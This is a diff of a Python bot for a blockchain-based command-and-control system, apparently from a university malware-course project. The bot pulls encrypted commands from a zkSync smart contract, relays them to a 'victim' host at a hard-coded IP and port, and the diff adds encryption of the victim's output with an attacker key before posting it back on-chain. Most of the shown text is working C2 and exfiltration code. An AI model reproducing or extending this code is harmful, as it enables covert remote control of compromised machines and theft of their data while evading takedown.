@@ -237,8 +237,9 @@ from nacl.public import PrivateKey, PublicKey, Box
 from dotenv import load_dotenv
 import subprocess
 
+
 def load_contract_address():
-    load_dotenv(override=True)  # Reload env vars each time
+    load_dotenv(override=True)
     return os.getenv("CURRENT_C2_ADDRESS")
 
 
@@ -274,7 +275,7 @@ def fund_ephemeral_wallet(w3, from_acct, to_acct, chain_id):
 
 
 def forward_to_victim(command):
-    HOST = "192.168.226.128"  # Update if your victim machine has a different IP
+    HOST = "192.168.226.128"
     PORT = 9999
     try:
         print(f"[>] Connecting to victim at {HOST}:{PORT}")
@@ -303,14 +304,34 @@ def execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key):
     command = box.decrypt(ciphertext, nonce).decode()
     print("[+] Command received:", command)
 
-    # Forward decrypted command to victim machine
+    # Forward command to victim and get output
     output = forward_to_victim(command)
 
-    # Submit output to the contract
+    # Encrypt the output using attacker's public key
+    attacker_pubkey_b64 = os.getenv("C2_PUBLIC_KEY")
+    if not attacker_pubkey_b64:
+        raise ValueError("C2_PUBLIC_KEY not found in .env")
+
+    attacker_pubkey = PublicKey(base64.b64decode(attacker_pubkey_b64))
+    ephemeral_key = PrivateKey.generate()
+    box = Box(ephemeral_key, attacker_pubkey)
+
+    nonce = os.urandom(24)
+    encrypted = box.encrypt(output.encode(), nonce)
+
+    encrypted_payload = {
+        "epk": base64.b64encode(bytes(ephemeral_key.public_key)).decode(),
+        "nonce": base64.b64encode(nonce).decode(),
+        "ciphertext": base64.b64encode(encrypted.ciphertext).decode()
+    }
+
+    encrypted_output_json = json.dumps(encrypted_payload)
+
+    # Submit encrypted output to the contract
     balance = w3.eth.get_balance(ephemeral_wallet.address)
     print(f"[DEBUG] Ephemeral wallet balance: {w3.from_wei(balance, 'ether')} ETH")
 
-    tx = contract.functions.submitOutput(output).build_transaction({
+    tx = contract.functions.submitOutput(encrypted_output_json).build_transaction({
         "from": ephemeral_wallet.address,
         "nonce": w3.eth.get_transaction_count(ephemeral_wallet.address),
         "gas": 500000,
@@ -319,7 +340,7 @@ def execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key):
     })
     signed = ephemeral_wallet.sign_transaction(tx)
     tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
-    print(f"[+] Output submitted (tx: {tx_hash.hex()})")
+    print(f"[+] Encrypted output submitted (tx: {tx_hash.hex()})")
 
 
 def main():
@@ -333,24 +354,20 @@ def main():
     w3 = Web3(Web3.HTTPProvider(rpc_url))
     print(f"[*] Connected to zkSync network (chain ID: {w3.eth.chain_id})")
 
-    # Ephemeral wallet
     ephemeral_wallet = w3.eth.account.create()
     w3.eth.default_account = ephemeral_wallet.address
     print(f"[*] Created ephemeral wallet: {ephemeral_wallet.address}")
 
-    # Rich wallet
     with open("/home/alishba/Documents/uni/sem4/malware/project/local-setup/rich-wallets.json", "r") as f:
         wallets = json.load(f)
     rich_acct = get_funded_wallet(w3, wallets)
 
     fund_ephemeral_wallet(w3, rich_acct, ephemeral_wallet, w3.eth.chain_id)
 
-    # First run
     last_seen_contract_address = load_contract_address()
     contract = load_contract(w3, last_seen_contract_address, abi)
     execute_command_flow(w3, contract, ephemeral_wallet, bot_private_key)
 
-    # Loop for new contracts
     while True:
         time.sleep(30)
         new_address = load_contract_address()
